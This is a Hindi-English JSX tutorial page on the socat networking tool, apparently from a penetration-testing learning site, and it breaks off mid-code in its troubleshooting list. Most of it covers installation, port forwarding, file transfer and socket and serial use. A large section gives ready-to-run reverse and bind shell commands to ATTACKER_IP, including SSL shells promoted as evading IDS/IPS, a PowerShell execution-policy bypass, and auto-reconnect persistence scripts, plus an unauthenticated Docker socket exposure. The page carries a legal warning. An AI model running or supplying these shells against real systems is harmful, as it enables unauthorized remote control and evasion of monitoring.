import TutorialLayout from '../../components/TutorialLayout'
import CodeBlock from '../../components/CodeBlock'

export default function Socat() {
  return (
    <TutorialLayout
      title="socat"
      subtitle="SOcket CAT — बाइडायरेक्शनल डेटा रिले और नेटवर्किंग स्विस आर्मी नाइफ"
      icon="🔌"
      prev={{ to: '/tool/chisel', label: 'chisel' }}
      next={{ to: '/tool/binwalk', label: 'binwalk' }}
    >
      <h2>What is Socat?</h2>
      <p>
        Socat (SOcket CAT) एक बेहद शक्तिशाली बाइडायरेक्शनल डेटा रिले टूल है जो दो इंडिपेंडेंट डेटा चैनल्स के बीच कनेक्शन बनाता है। यह Netcat का एडवांस्ड और ज़्यादा फीचर-रिच वर्जन है जो TCP, UDP, SSL/TLS, UNIX sockets, pipes, serial ports, और कई अन्य प्रोटोकॉल्स को सपोर्ट करता है। Socat को नेटवर्किंग का "स्विस आर्मी नाइफ" कहा जाता है क्योंकि यह लगभग हर तरह की डेटा कम्युनिकेशन हैंडल कर सकता है। पेनेट्रेशन टेस्टिंग, सिस्टम एडमिनिस्ट्रेशन, और नेटवर्क ट्रबलशूटिंग में यह एक essential टूल है।
      </p>
      <p>
        Socat की सबसे बड़ी खासियत यह है कि यह किसी भी दो "एड्रेसेज़" को जोड़ सकता है — चाहे वो TCP socket हो, UDP socket हो, file हो, pipe हो, UNIX socket हो, serial port हो, या SSL/TLS connection। यह multipurpose data relay जैसा काम करता है। Netcat सिर्फ basic TCP/UDP connections handle करता है, लेकिन Socat SSL encryption, UNIX sockets, TTY shells, serial communication, और बहुत कुछ कर सकता है। अगर Netcat काम नहीं कर रहा तो Socat ज़रूर try करें।
      </p>
      <p>
        Socat Gerhard Rieger ने 2001 में डेवलप किया था। यह C भाषा में लिखा गया है और Linux, macOS, और BSD सिस्टम्स पर चलता है। यह open source है और GPL license के तहत उपलब्ध है। Kali Linux में यह प्री-इंस्टॉल्ड आता है। Socat का syntax थोड़ा complex है लेकिन एक बार समझ आ जाए तो यह बहुत powerful टूल है। यह 30+ अलग-अलग address types support करता है जो इसे सबसे versatile networking tool बनाता है।
      </p>
      <p>
        Penetration testing में Socat का सबसे common उपयोग reverse shells बनाना है। Socat SSL encrypted reverse shells बना सकता है जो IDS/IPS systems detect नहीं कर पाते। इसके अलावा port forwarding, file transfer, UNIX socket forwarding, और serial port communication के लिए भी बहुत useful है। Red teamers और penetration testers इसे daily basis पर use करते हैं। Socat की एक और खासियत है — यह data transformation कर सकता है, जैसे newline conversion, character encoding changes, और data logging।
      </p>
      <p>
        Socat का architecture event-driven है — जब data एक side पर आता है, तो यह automatically दूसरी side पर forward हो जाता है। यह bidirectional है, यानी दोनों sides से एक साथ data flow हो सकता है। यह blocking और non-blocking दोनों modes support करता है। Fork option से multiple simultaneous connections भी handle कर सकता है। Socat security research के साथ-साथ system administration में भी बहुत useful है — database socket forwarding, log aggregation, और service proxying जैसे tasks आसानी से कर सकते हैं।
      </p>

      <div className="warning-box mb-6">
        <strong>⚠️ कानूनी चेतावनी:</strong> Socat केवल अधिकृत पेनेट्रेशन टेस्टिंग और सुरक्षा शोध के लिए इस्तेमाल करें। बिना अनुमति के नेटवर्क टूल्स का उपयोग अवैध है। भारत में आईटी एक्ट 2000 की धारा 43 और 66 के तहत अनधिकृत नेटवर्क एक्सेस अपराध हो सकता है। केवल अपने लैब या लिखित अनुमति के साथ ही इस्तेमाल करें।
      </div>

      <h2>History of Socat</h2>
      <p>
        Socat की शुरुआत 2001 में हुई जब Gerhard Rieger ने Netcat की limitations को दूर करने के लिए एक नया टूल बनाया। Netcat में SSL/TLS support नहीं था, UNIX sockets नहीं थे, और advanced data manipulation की सुविधा नहीं थी। Gerhard ने इन सभी कमियों को दूर करते हुए Socat बनाया।
      </p>
      <p>
        Socat का नाम "SOcket CAT" से आया है — जैसे cat command files को read करता है, वैसे ही Socat sockets को read/write करता है। शुरू में यह सिर्फ Linux के लिए था, लेकिन बाद में macOS, BSD, और Windows (Cygwin/WSL) support भी add हुआ। 2003 में इसे major rewrite किया गया जिससे performance और stability में बड़ा सुधार हुआ।
      </p>
      <p>
        आज Socat Linux ecosystem में standard networking tool बन गया है। यह सभी major Linux distributions में repositories में available है। Kali Linux, Parrot OS, और अन्य security-focused distributions में यह प्री-इंस्टॉल्ड आता है। Socat का latest stable version 1.8.0 है जो 2024 में release हुआ। Community actively development कर रही है और नए features add होते रहते हैं।
      </p>

      <h2>How Socat Works?</h2>
      <p>
        Socat दो "एड्रेसेज़" के बीच data relay करता है। हर एड्रेस एक data source या destination होता है। Socat का basic syntax है: socat [options] address1 address2। दो addresses के बीच data bidirectional flow होता है।
      </p>
      <ul className="list-disc list-inside text-gray-300 mb-4 space-y-2">
        <li><strong className="text-white">TCP/UDP Sockets:</strong> Network connections — client और server दोनों modes</li>
        <li><strong className="text-white">SSL/TLS:</strong> Encrypted connections — certificate verification के साथ</li>
        <li><strong className="text-white">UNIX Sockets:</strong> Local IPC (Inter-Process Communication)</li>
        <li><strong className="text-white">Files:</strong> Read/Write file operations</li>
        <li><strong className="text-white">Pipes:</strong> stdin/stdout और named pipes (FIFO)</li>
        <li><strong className="text-white">Exec:</strong> Process execution — command output को socket पर भेजना</li>
        <li><strong className="text-white">OpenSSL:</strong> SSL/TLS encrypted connections — mutual authentication support</li>
        <li><strong className="text-white">Serial Ports:</strong> /dev/ttyS0, /dev/ttyUSB0 — hardware communication</li>
        <li><strong className="text-white">SCTP:</strong> Stream Control Transmission Protocol — telecom networks</li>
        <li><strong className="text-white">SOCKS4/5:</strong> SOCKS proxy connections — firewall bypass</li>
        <li><strong className="text-white">PROXY:</strong> HTTP proxy connections — CONNECT method</li>
        <li><strong className="text-white">TUN/TAP:</strong> Virtual network interfaces — VPN-like functionality</li>
        <li><strong className="text-white">RETRY:</strong> Connection retry with backoff — persistent connections</li>
        <li><strong className="text-white">SYSTEM:</strong> Shell command execution — complex pipelines</li>
      </ul>
      <p>
        Socat का architecture event-driven है। जब data एक side पर आता है, तो यह automatically दूसरी side पर forward हो जाता है। यह bidirectional है — दोनों sides से एक साथ data flow हो सकता है। Fork option से multiple simultaneous connections handle होती हैं। Socat internally select() system call use करता है जिससे efficient I/O multiplexing होता है।
      </p>

      <h2>Installation</h2>
      <p>
        काली नेटहंटर में Socat प्री-इंस्टॉल्ड आता है। अगर नहीं है तो कई तरीकों से इंस्टॉल कर सकते हैं।
      </p>
      <CodeBlock
        title="Socat Installation"
        code={`# apt से (सबसे आसान):
sudo apt update
sudo apt install socat

# सोर्स से (latest version):
wget http://www.dest-unreach.org/socat/download/socat-1.8.0.0.tar.gz
tar -xzf socat-1.8.0.0.tar.gz
cd socat-1.8.0.0
./configure
make
sudo make install

# Arch Linux:
sudo pacman -S socat

# Fedora:
sudo dnf install socat

# macOS (Homebrew):
brew install socat

# Docker:
docker run -it alpine apk add socat

# वर्जन चेक:
socat -V

# सहायता:
socat -h

# सभी address types देखें:
socat -V | grep "address types"`}
      />

      <h2>Basic Usage</h2>
      <p>
        Socat का basic syntax बहुत simple है — दो addresses दो, data flow अपने आप होगा। हर address एक type:parameter format में होता है। Socat automatically data direction detect करता है और bidirectional relay बनाता है।
      </p>
      <CodeBlock
        title="Basic Connections"
        code={`# TCP connection बनाएं (client mode):
socat - TCP:target_ip:80

# UDP connection:
socat - UDP:target_ip:53

# TCP listener शुरू करें (server mode, port 4444):
socat TCP-LISTEN:4444,reuseaddr -

# TCP listener with fork (multiple connections):
socat TCP-LISTEN:4444,reuseaddr,fork -

# stdin से TCP:
echo "Hello World" | socat - TCP:target_ip:4444

# TCP से stdout:
socat TCP:target_ip:4444 -

# File receive करें:
socat TCP-LISTEN:4444,reuseaddr FILE:received.txt,create

# File भेजें:
socat FILE:secret.txt TCP:target_ip:4444

# HTTP request भेजें:
echo -e "GET / HTTP/1.1\\r\\nHost: target.com\\r\\n\\r\\n" | socat - TCP:target.com:80

# Banner grab:
socat - TCP:target_ip:22,connect-timeout=3

# TCP connection with timeout:
socat - TCP:target_ip:80,connect-timeout=5

# Connection retry:
socat - TCP:target_ip:80,retry=3,intervall=5`}
      />

      <h2>Important Options</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">Option</th>
              <th className="text-left py-2 px-3 text-neon-green">क्या करता है</th>
              <th className="text-left py-2 px-3 text-neon-green">उदाहरण</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-</td><td className="py-2 px-3">stdin/stdout का उपयोग करें</td><td className="py-2 px-3 font-mono text-xs">socat - TCP:ip:port</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">TCP-LISTEN:port</td><td className="py-2 px-3">TCP listener शुरू करें</td><td className="py-2 px-3 font-mono text-xs">TCP-LISTEN:4444</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">TCP:host:port</td><td className="py-2 px-3">TCP client connection</td><td className="py-2 px-3 font-mono text-xs">TCP:192.168.1.1:80</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">UDP:host:port</td><td className="py-2 px-3">UDP connection</td><td className="py-2 px-3 font-mono text-xs">UDP:8.8.8.8:53</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">reuseaddr</td><td className="py-2 px-3">Address reuse enable</td><td className="py-2 px-3 font-mono text-xs">TCP-LISTEN:4444,reuseaddr</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">fork</td><td className="py-2 px-3">Multiple connections handle</td><td className="py-2 px-3 font-mono text-xs">TCP-LISTEN:4444,fork</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">EXEC:cmd</td><td className="py-2 px-3">Command execute करें</td><td className="py-2 px-3 font-mono text-xs">EXEC:/bin/bash</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">FILE:name</td><td className="py-2 px-3">File से read/write</td><td className="py-2 px-3 font-mono text-xs">FILE:test.txt,create</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">OPENSSL:host:port</td><td className="py-2 px-3">SSL/TLS client</td><td className="py-2 px-3 font-mono text-xs">OPENSSL:ip:4444,verify=0</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">OPENSSL-LISTEN</td><td className="py-2 px-3">SSL/TLS listener</td><td className="py-2 px-3 font-mono text-xs">OPENSSL-LISTEN:4444,cert=pem</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">UNIX-LISTEN:path</td><td className="py-2 px-3">UNIX socket listener</td><td className="py-2 px-3 font-mono text-xs">UNIX-LISTEN:/tmp/s.sock</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">UNIX-CONNECT:path</td><td className="py-2 px-3">UNIX socket client</td><td className="py-2 px-3 font-mono text-xs">UNIX-CONNECT:/tmp/s.sock</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">PIPE:name</td><td className="py-2 px-3">Named pipe (FIFO)</td><td className="py-2 px-3 font-mono text-xs">PIPE:/tmp/mypipe</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">pty,stderr</td><td className="py-2 px-3">PTY allocation (interactive shell)</td><td className="py-2 px-3 font-mono text-xs">EXEC:bash,pty,stderr</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">setsid</td><td className="py-2 px-3">New session create</td><td className="py-2 px-3 font-mono text-xs">EXEC:bash,pty,setsid</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">connect-timeout</td><td className="py-2 px-3">Connection timeout</td><td className="py-2 px-3 font-mono text-xs">TCP:ip:port,connect-timeout=5</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">retry</td><td className="py-2 px-3">Connection retry count</td><td className="py-2 px-3 font-mono text-xs">TCP:ip:port,retry=3</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">intervall</td><td className="py-2 px-3">Retry interval (seconds)</td><td className="py-2 px-3 font-mono text-xs">TCP:ip:port,retry=3,intervall=5</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">sigint</td><td className="py-2 px-3">Ctrl+C support in shell</td><td className="py-2 px-3 font-mono text-xs">EXEC:bash,pty,sigint</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">sane</td><td className="py-2 px-3">Sane terminal settings</td><td className="py-2 px-3 font-mono text-xs">EXEC:bash,pty,sane</td></tr>
          </tbody>
        </table>
      </div>

      <h2>Reverse Shell (10+ Variants)</h2>
      <p>
        Socat से कई तरह के reverse shells बना सकते हो — basic से लेकर fully interactive TTY तक। Socat का shell Netcat से ज़्यादा stable और feature-rich होता है। SSL encrypted shells IDS/IPS systems detect नहीं कर पाते जो इसे red team operations के लिए ideal बनाता है।
      </p>
      <CodeBlock
        title="Basic Reverse Shell"
        code={`# Attacker side (listener):
socat TCP-LISTEN:4444,reuseaddr -

# Victim side:
socat TCP:ATTACKER_IP:4444 EXEC:/bin/bash

# यह simplest reverse shell है — लेकिन interactive नहीं है`}
      />
      <CodeBlock
        title="Fully Interactive TTY Shell"
        code={`# Attacker side (TTY के साथ):
socat FILE:\`tty\`,raw,echo=0 TCP-LISTEN:4444,reuseaddr

# Victim side (pty, stderr, setsid):
socat TCP:ATTACKER_IP:4444 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane

# अब पूरी तरह interactive shell मिलेगा:
# - Tab completion काम करेगा
# - vim, nano चलेंगे
# - Ctrl+C काम करेगा
# - clear screen काम करेगा
# - Arrow keys काम करेंगे
# - Background processes काम करेंगे`}
      />
      <CodeBlock
        title="SSL Encrypted Reverse Shell"
        code={`# Step 1: SSL certificate generate करें:
openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 365 -out shell.crt
cat shell.key shell.crt > shell.pem

# Step 2: Attacker (SSL listener):
socat OPENSSL-LISTEN:4444,cert=shell.pem,verify=0 FILE:\`tty\`,raw,echo=0

# Step 3: Victim (SSL client):
socat OPENSSL:ATTACKER_IP:4444,verify=0 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane

# यह encrypted connection है — Wireshark में data नहीं दिखेगा
# IDS/IPS detect नहीं कर पाएगा
# Network monitoring tools bypass होंगे`}
      />
      <CodeBlock
        title="Python Reverse Shell via Socat"
        code={`# Victim side (Python shell):
socat TCP:ATTACKER_IP:4444 EXEC:"python3 -c 'import pty;pty.spawn(\\"/bin/bash\\")'",pty,stderr,setsid

# Attacker side:
socat FILE:\`tty\`,raw,echo=0 TCP-LISTEN:4444,reuseaddr`}
      />
      <CodeBlock
        title="mkfifo Named Pipe Shell"
        code={`# Victim side (mkfifo method):
mkfifo /tmp/backpipe
socat TCP:ATTACKER_IP:4444 EXEC:/bin/bash,pty,stderr,setsid SYSTEM:"tail -f /tmp/backpipe" | /bin/sh 2>&1 > /tmp/backpipe

# यह method older systems पर भी काम करता है`}
      />
      <CodeBlock
        title="Windows PowerShell Shell"
        code={`# Windows victim (PowerShell):
socat TCP:ATTACKER_IP:4444 EXEC:"powershell -NoProfile -ExecutionPolicy Bypass",pty,stderr,setsid

# ya cmd.exe:
socat TCP:ATTACKER_IP:4444 EXEC:cmd.exe,pty,stderr,setsid

# Encrypted Windows shell:
socat OPENSSL:ATTACKER_IP:4444,verify=0 EXEC:"powershell -NoProfile",pty,stderr`}
      />
      <CodeBlock
        title="Bind Shell"
        code={`# Victim side (bind shell listener):
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane

# Attacker side (connect):
socat - TCP:VICTIM_IP:4444

# SSL bind shell:
# Victim:
socat OPENSSL-LISTEN:4444,cert=shell.pem,verify=0,fork EXEC:/bin/bash,pty,stderr,setsid

# Attacker:
socat - OPENSSL:VICTIM_IP:4444,verify=0`}
      />
      <CodeBlock
        title="Double Relay Shell"
        code={`# Double relay — attacker से directly victim नहीं पहुंच सकते
# Jump host (middle server) पर:
socat TCP-LISTEN:5555,reuseaddr TCP:VICTIM_IP:4444

# Victim पर:
socat TCP:JUMP_HOST:5555 EXEC:/bin/bash,pty,stderr,setsid

# Attacker पर:
socat FILE:\`tty\`,raw,echo=0 TCP:JUMP_HOST:5555`}
      />
      <CodeBlock
        title="Auto-Reconnect Shell"
        code={`# Persistent reverse shell — disconnect होने पर auto-reconnect:
while true; do
  socat TCP:ATTACKER_IP:4444,connect-timeout=10,retry=3,intervall=30 \\
    EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
  sleep 60
done`}
      />

      <h2>TCP/UDP Port Forwarding</h2>
      <p>
        Socat से port forwarding बहुत आसान है — local और remote दोनों। Single port से लेकर multiple ports तक। Port forwarding penetration testing में internal services access करने के लिए बहुत useful है।
      </p>
      <CodeBlock
        title="Port Forwarding Methods"
        code={`# Local port forward (8080 → target:80):
socat TCP-LISTEN:8080,reuseaddr TCP:target_ip:80

# Remote port forward (internal network):
socat TCP-LISTEN:4444,reuseaddr TCP:internal_ip:80

# Traffic redirect (multiple connections):
socat TCP-LISTEN:80,fork TCP:real_server:80

# UDP port forward:
socat UDP-LISTEN:5353,reuseaddr UDP:target_ip:53

# Bidirectional port forward:
socat TCP-LISTEN:8080,reuseaddr,fork TCP:target_ip:80,connect-timeout=5

# IPv6 port forward:
socat TCP6-LISTEN:8080,reuseaddr,fork TCP:target_ip:80

# Load balancer (round-robin via script):
for port in 80 443 8080 8443; do
  socat TCP-LISTEN:$port,fork,reuseaddr TCP:target_ip:$port &
done

# Port forwarding with logging:
socat -v TCP-LISTEN:8080,reuseaddr,fork TCP:target_ip:80 2>&1 | tee forwarding.log`}
      />
      <CodeBlock
        title="SOCKS Proxy"
        code={`# SOCKS4 proxy बनाएं:
socat TCP-LISTEN:1080,reuseaddr,fork SOCKS4A:proxy:target_ip:80,socksuser=nobody

# HTTP proxy:
socat TCP-LISTEN:8080,reuseaddr,fork PROXY:proxy.example.com:target_ip:80,proxyport=3128

# SOCKS5 (with authentication):
socat TCP-LISTEN:1080,reuseaddr,fork SOCKS5:target_ip:80,socksuser=admin,sockspassword=secret`}
      />

      <h2>File Transfer</h2>
      <p>
        Socat से files transfer करना Netcat से ज़्यादा reliable है — SSL encryption भी लगा सकते हो। Binary files, directories, और large files सभी transfer कर सकते हो।
      </p>
      <CodeBlock
        title="File Transfer Methods"
        code={`# Method 1: Simple file send/receive
# Receiver side:
socat TCP-LISTEN:4444,reuseaddr FILE:received.txt,create

# Sender side:
socat FILE:secret.txt TCP:target_ip:4444

# Method 2: Encrypted file transfer
# Receiver:
socat OPENSSL-LISTEN:4444,cert=shell.pem,verify=0 FILE:received.txt,create

# Sender:
socat FILE:secret.txt OPENSSL:target_ip:4444,verify=0

# Method 3: Directory transfer (tar के साथ):
# Receiver:
socat TCP-LISTEN:4444,reuseaddr EXEC:"tar xzf -"

# Sender:
tar czf - /path/to/directory | socat - TCP:target_ip:4444

# Method 4: Binary file transfer:
# Receiver:
socat TCP-LISTEN:4444,reuseaddr FILE:received.bin,create,binary

# Sender:
socat FILE:payload.bin TCP:target_ip:4444,binary

# Method 5: Progress bar file transfer:
# Receiver:
socat TCP-LISTEN:4444,reuseaddr EXEC:"pv > received.txt"

# Sender:
pv secret.txt | socat - TCP:target_ip:4444

# Method 6: Encrypted directory transfer:
# Receiver:
socat OPENSSL-LISTEN:4444,cert=shell.pem,verify=0 EXEC:"tar xzf -"

# Sender:
tar czf - /data | socat - OPENSSL:target_ip:4444,verify=0`}
      />

      <h2>UNIX Socket Forwarding</h2>
      <p>
        UNIX sockets को TCP पर forward करना — Docker, database connections, और IPC के लिए useful। System administrators और penetration testers दोनों के लिए important technique है।
      </p>
      <CodeBlock
        title="UNIX Socket Operations"
        code={`# UNIX socket बनाएं:
socat UNIX-LISTEN:/tmp/mysocket.sock -

# UNIX socket से TCP forward:
socat UNIX-LISTEN:/tmp/mysocket.sock TCP:localhost:5432

# TCP से UNIX socket forward:
socat TCP-LISTEN:5432,reuseaddr UNIX-CONNECT:/var/run/postgresql/.s.PGSQL.5432

# Docker socket forward (remote access):
socat TCP-LISTEN:2375,reuseaddr,fork UNIX-CONNECT:/var/run/docker.sock

# MySQL socket forward:
socat TCP-LISTEN:3306,reuseaddr UNIX-CONNECT:/var/run/mysqld/mysqld.sock

# Redis socket forward:
socat TCP-LISTEN:6379,reuseaddr UNIX-CONNECT:/var/run/redis/redis.sock

# Systemd journal socket:
socat UNIX-LISTEN:/tmp/journal.sock,fork EXEC:"journalctl -f"

# Kubernetes API socket:
socat TCP-LISTEN:6443,reuseaddr UNIX-CONNECT:/var/run/kubernetes/admin.sock`}
      />

      <h2>Serial Port Communication</h2>
      <p>
        Socat serial ports से communicate कर सकता है — embedded systems, IoT devices, और hardware hacking के लिए useful। Serial port communication routers, switches, और embedded devices को configure करने के लिए essential है।
      </p>
      <CodeBlock
        title="Serial Port Operations"
        code={`# Serial port से communicate:
socat /dev/ttyUSB0,raw,echo=0,b115200 -

# Serial port को TCP पर forward:
socat TCP-LISTEN:4444,reuseaddr /dev/ttyUSB0,raw,echo=0,b115200

# Serial port को file में log:
socat /dev/ttyUSB0,raw,echo=0,b9600 FILE:serial_log.txt,create

# Serial port settings:
# b9600, b19200, b38400, b57600, b115200 (baud rates)
# raw, echo=0, cs8, cstopb (serial settings)

# Two serial ports connect:
socat /dev/ttyUSB0,raw,echo=0,b115200 /dev/ttyUSB1,raw,echo=0,b115200

# Serial port monitor:
socat -v /dev/ttyUSB0,raw,echo=0,b115200

# Serial port with logging:
socat -v /dev/ttyUSB0,raw,echo=0,b115200 FILE:serial.log,create 2>&1 | tee monitor.log`}
      />

      <h2>Data Transformation</h2>
      <p>
        Socat data transform भी कर सकता है — encoding changes, newline conversion, और data logging। यह feature network debugging और data processing में बहुत useful है।
      </p>
      <CodeBlock
        title="Data Transformation"
        code={`# Traffic logging (verbose):
socat -v TCP-LISTEN:8080,reuseaddr TCP:target:80 2>&1 | tee traffic.log

# Hex dump of traffic:
socat -x TCP-LISTEN:8080,reuseaddr TCP:target:80

# Newline conversion (CRLF to LF):
socat TCP-LISTEN:8080,reuseaddr,crlf TCP:target:80

# Data injection:
echo "INJECTED_DATA" | socat - TCP-LISTEN:8080,reuseaddr TCP:target:80

# Traffic mirroring (send to multiple destinations):
socat TCP-LISTEN:8080,reuseaddr,fork SYSTEM:"socat - TCP:target1:80 & socat - TCP:target2:80"

# Timestamp logging:
socat -v TCP-LISTEN:8080,reuseaddr TCP:target:80 2>&1 | while read line; do echo "$(date): $line"; done`}
      />

      <h2>Scripting and Automation</h2>
      <p>
        Socat को bash scripts में इस्तेमाल कर सकते हो automated tasks के लिए। Persistent access, port forwarding automation, और monitoring scripts बनाना आसान है।
      </p>
      <CodeBlock
        title="Auto-Reconnect Reverse Shell"
        code={`#!/bin/bash
# Auto-reconnect reverse shell script
# Connection drop होने पर automatically reconnect करेगा

ATTACKER_IP="192.168.1.100"
PORT=4444
DELAY=30

while true; do
  echo "[+] Connection try कर रहे हैं..."
  socat TCP:$ATTACKER_IP:$PORT,connect-timeout=10,retry=3 \\
    EXEC:/bin/bash,pty,stderr,setsid,sigint,sane

  echo "[+] Connection drop हुआ, \${DELAY}s बाद retry..."
  sleep $DELAY
done`}
      />
      <CodeBlock
        title="Multi-Port Listener Script"
        code={`#!/bin/bash
# कई ports पर listener शुरू करें

for port in 4444 4445 4446 4447 4448; do
  echo "[+] Listener शुरू: port $port"
  socat TCP-LISTEN:$port,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid &
done

echo "[+] सभी listeners चल रहे हैं (PIDs: $(jobs -p))"
echo "[+] बंद करने के लिए: kill $(jobs -p)"
wait`}
      />
      <CodeBlock
        title="Port Scanner Script"
        code={`#!/bin/bash
# Socat-based port scanner

TARGET=$1
PORTS="22 80 443 8080 3306 5432 8443 9090"

echo "[+] Scanning: $TARGET"

for port in $PORTS; do
  timeout 3 socat /dev/null TCP:$TARGET:$port,connect-timeout=2 2>/dev/null
  if [ $? -eq 0 ]; then
    echo "[+] Port $port: OPEN"
  else
    echo "[-] Port $port: CLOSED/FILTERED"
  fi
done`}
      />
      <CodeBlock
        title="Persistent Port Forwarding Service"
        code={`#!/bin/bash
# Persistent port forwarding with systemd

# /etc/systemd/system/socat-forward.service बनाएं:
cat > /etc/systemd/system/socat-forward.service << 'EOF'
[Unit]
Description=Socat Port Forward
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/socat TCP-LISTEN:8080,reuseaddr,fork TCP:internal-server:80
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF

# Enable और start:
sudo systemctl enable socat-forward
sudo systemctl start socat-forward
sudo systemctl status socat-forward`}
      />

      <h2>Socat vs Other Tools</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">फ़ीचर</th>
              <th className="text-left py-2 px-3 text-neon-green">Socat</th>
              <th className="text-left py-2 px-3 text-neon-green">Netcat</th>
              <th className="text-left py-2 px-3 text-neon-green">Ncat</th>
              <th className="text-left py-2 px-3 text-neon-green">Chisel</th>
              <th className="text-left py-2 px-3 text-neon-green">stunnel</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">SSL/TLS</td><td className="py-2 px-3 text-green-400">हाँ</td><td className="py-2 px-3 text-red-400">नहीं</td><td className="py-2 px-3 text-green-400">हाँ</td><td className="py-2 px-3 text-green-400">हाँ</td><td className="py-2 px-3 text-green-400">हाँ</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">UNIX Sockets</td><td className="py-2 px-3 text-green-400">हाँ</td><td className="py-2 px-3 text-red-400">नहीं</td><td className="py-2 px-3 text-red-400">नहीं</td><td className="py-2 px-3 text-red-400">नहीं</td><td className="py-2 px-3 text-red-400">नहीं</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">TTY Shell</td><td className="py-2 px-3 text-green-400">हाँ</td><td className="py-2 px-3 text-red-400">नहीं</td><td className="py-2 px-3 text-red-400">नहीं</td><td className="py-2 px-3 text-red-400">नहीं</td><td className="py-2 px-3 text-red-400">नहीं</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Serial Ports</td><td className="py-2 px-3 text-green-400">हाँ</td><td className="py-2 px-3 text-red-400">नहीं</td><td className="py-2 px-3 text-red-400">नहीं</td><td className="py-2 px-3 text-red-400">नहीं</td><td className="py-2 px-3 text-red-400">नहीं</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Tunneling</td><td className="py-2 px-3 text-yellow-400">बेसिक</td><td className="py-2 px-3 text-red-400">नहीं</td><td className="py-2 px-3 text-yellow-400">बेसिक</td><td className="py-2 px-3 text-green-400">एडवांस्ड</td><td className="py-2 px-3 text-green-400">एडवांस्ड</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">IPv6</td><td className="py-2 px-3 text-green-400">हाँ</td><td className="py-2 px-3 text-yellow-400">लिमिटेड</td><td className="py-2 px-3 text-green-400">हाँ</td><td className="py-2 px-3 text-green-400">हाँ</td><td className="py-2 px-3 text-green-400">हाँ</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Fork (Multi-conn)</td><td className="py-2 px-3 text-green-400">हाँ</td><td className="py-2 px-3 text-yellow-400">लिमिटेड</td><td className="py-2 px-3 text-green-400">हाँ</td><td className="py-2 px-3 text-green-400">हाँ</td><td className="py-2 px-3 text-green-400">हाँ</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Proxy Support</td><td className="py-2 px-3 text-green-400">SOCKS4/5, HTTP</td><td className="py-2 px-3 text-red-400">नहीं</td><td className="py-2 px-3 text-yellow-400">SOCKS4</td><td className="py-2 px-3 text-green-400">HTTP/SOCKS</td><td className="py-2 px-3 text-red-400">नहीं</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Data Transform</td><td className="py-2 px-3 text-green-400">हाँ</td><td className="py-2 px-3 text-red-400">नहीं</td><td className="py-2 px-3 text-red-400">नहीं</td><td className="py-2 px-3 text-red-400">नहीं</td><td className="py-2 px-3 text-red-400">नहीं</td></tr>
            <tr><td className="py-2 px-3 text-white">Ease of Use</td><td className="py-2 px-3 text-yellow-400">Complex syntax</td><td className="py-2 px-3 text-green-400">Simple</td><td className="py-2 px-3 text-green-400">Simple</td><td className="py-2 px-3 text-green-400">Simple</td><td className="py-2 px-3 text-yellow-400">Config-based</td></tr>
          </tbody>
        </table>
      </div>

      <h2>Common Problems and Solutions</h2>
      <div className="space-y-3 mt-4">
        {[
          { q: 'Connection refused error आ रहा है', a: 'Port already in use हो सकता है — reuseaddr option लगाओ। lsof -i :port से चेक करो कौन use कर रहा है। Firewall rules भी check करो।' },
          { q: 'SSL certificate error आ रहा है', a: 'Certificate generate करते समय verify=0 लगाओ। PEM file path सही है या चेक करो। Certificate और key दोनों same file में होने चाहिए।' },
          { q: 'Reverse shell disconnect हो रहा है', a: 'fork option लगाओ ताकि multiple connections handle हों। tmux या screen में listener चलाओ। Auto-reconnect script use करो।' },
          { q: 'File transfer incomplete हो रहा है', a: 'Large files के लिए tar + socat combo use करो। SSL connection stable रहता है। Binary mode use करो: FILE:file,binary' },
